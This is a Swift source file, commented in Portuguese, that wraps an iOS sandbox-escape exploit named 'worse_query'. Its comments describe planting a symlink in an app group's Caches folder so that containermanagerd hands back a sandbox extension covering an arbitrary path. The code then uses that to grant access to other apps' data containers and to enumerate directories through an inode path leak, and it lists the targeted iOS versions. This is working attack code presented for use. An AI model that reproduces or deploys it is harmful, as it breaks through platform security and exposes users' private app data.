import Foundation
import Darwin

/// Adaptador para o worse_query (forcequitOS) — sucessor do bad_query.
///
/// Diferença central: em vez de traversal por partDomain no query do
/// containermanagerd, o worse_query planta um symlink em
/// `<appgroup>/Library/Caches` apontando para o alvo arbitrário e pede o
/// token de sandbox do grupo por query de classe 7 / part 3. O daemon resolve
/// o caminho do symlink e devolve uma extension que cobre o destino.
///
/// Variante integrada (reimplementada do build "5013"):
///  - App Group dinâmico: lido da assinatura via SecTaskCopyValueForEntitlement.
///    O mesmo binário funciona com qualquer certificado cujo perfil libere UM
///    App Group qualquer (ESign/GBox, perfil próprio, etc.).
///  - Query flags auto-calibráveis, persistidos em UserDefaults.
///  - Swap seguro do Library/Caches com recuperação de crash.
enum WorseQueryConfig {
    /// nil = grupo lido em runtime dos entitlements da assinatura.
    /// Preencha com um ID explícito apenas se o teu signer não liberar
    /// nenhum grupo (vira override "wq.appGroup" nos defaults).
    static let appGroupOverride: String? = nil
}

enum WorseQuery {
    /// Faixa do worse_query: todo iOS 26+ (26.0–26.7.2, 27.x, 27.3 beta).
    /// Os query flags auto-calibram por build, então o mesmo caminho cobre
    /// a faixa antiga do bad_query — ele fica só de fallback. Abaixo de 26
    /// segue o kernel exploit (17/18).
    static var isGrantApplicable: Bool {
        ProcessInfo.processInfo.operatingSystemVersion.majorVersion >= 26
    }

    /// Consome uma sandbox extension para `path` via worse_query.
    /// `create` pula o lstat inicial (o query ainda falha se o alvo não
    /// existir). Grupo e flags resolvidos dentro do C.
    @discardableResult
    static func grantContainerAccess(_ path: String, create: Bool = true) -> Int64 {
        guard isGrantApplicable else { return -1 }
        let clean = path.hasSuffix("/") ? String(path.dropLast()) : path
        if let override = WorseQueryConfig.appGroupOverride, !override.isEmpty {
            UserDefaults.standard.set(override, forKey: "wq.appGroup")
        }
        return worse_query_grant(clean, create)
    }

    static func release(_ handle: Int64) {
        worse_query_release(handle)
    }

    /// Sonda única e cacheada: consegue um grant para a raiz dos contêineres
    /// de app? É a prova de vida do caminho worse_query em 26.7+/27.x —
    /// substitui o probe de sandbox do kexploit nessa faixa.
    static let accessProbePath = "/var/mobile/Containers/Data/Application"
    private static var cachedAccess: Bool?

    static var accessAvailable: Bool {
        if let cached = cachedAccess { return cached }
        let handle = grantContainerAccess(accessProbePath)
        let ok = handle >= 0
        if ok { release(handle) }
        cachedAccess = ok
        log("worse_query: access probe \(accessProbePath) -> \(ok) (handle=\(handle))")
        return ok
    }

    /// Re-arma a sonda — chame a cada ativação do app: a assinatura não
    /// muda em runtime, mas o estado do daemon/group pode.
    static func resetProbeCache() {
        cachedAccess = nil
    }

    /// Enumeração de diretórios por inode. pathleak é o sucessor mais rápido
    /// do bad_query_list (devolve [String]) e roda em qualquer iOS; cai pro
    /// original se falhar.
    static func listDirectories(path: String, maxInode: Int64 = 2_000_000) -> [String] {
        let clean = path.hasSuffix("/") ? String(path.dropLast()) : path
        guard clean.hasPrefix("/") else { return [] }

        if let leaked = pathleak(clean, UInt64(maxInode)), !leaked.isEmpty {
            log("worse_query: pathleak \(clean) -> \(leaked.count) entries")
            return leaked
        }

        var pathC = clean.utf8CString.map { Int8($0) }
        guard let result = bad_query_list(&pathC, maxInode) else { return [] }
        defer { free(result) }
        return String(cString: result).components(separatedBy: "\n").filter { !$0.isEmpty }
    }
}
